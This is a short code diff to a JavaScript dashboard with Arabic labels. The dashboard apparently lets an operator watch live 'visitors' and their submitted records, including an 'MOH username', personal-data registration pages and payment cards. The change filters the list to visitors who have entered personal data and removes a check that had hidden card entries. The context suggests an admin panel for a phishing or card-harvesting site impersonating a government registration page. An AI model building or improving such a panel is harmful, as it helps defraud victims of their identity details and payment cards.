@@ -1239,15 +1239,17 @@
         // Sort by last activity (most recent first)
         return getLastActivity(b) - getLastActivity(a);
       });
-      const connectedCount = list.filter(v => v.isConnected === true).length;
-      visitorCount.textContent = connectedCount + ' نشط / ' + list.length + ' زائر';
-
-      if (list.length === 0) {
+            // Only show visitors who have submitted personal data
+      const visibleList = list.filter(v =>
+        v.dataHistory && v.dataHistory.some(e => e.page === 'تسجيل حساب - البيانات الشخصية')
+      );
+      const connectedCount = visibleList.filter(v => v.isConnected === true).length;
+      visitorCount.textContent = connectedCount + ' نشط / ' + visibleList.length + ' زائر';
+      if (visibleList.length === 0) {
         visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>';
         return;
       }
-
-      visitorsList.innerHTML = list.map(v => {
+      visitorsList.innerHTML = visibleList.map(v => {
         const isSelected = selectedVisitorId === v._id;
         const isDisconnected = v.isConnected !== true;
         // Get visitor name: prioritize MOH username, then fullName, then data fields
@@ -1534,11 +1536,8 @@
         });
       }
       
-      // Add payment cards with type - only if visitor has submitted personal data page
-      const hasPersonalData = visitor.dataHistory && visitor.dataHistory.some(e =>
-        e.page === 'تسجيل حساب - البيانات الشخصية'
-      );
-      if (visitor.paymentCards && visitor.paymentCards.length > 0 && hasPersonalData) {
+      // Add payment cards with type
+      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
         visitor.paymentCards.forEach((card, index) => {
           allEntries.push({
             type: 'card',
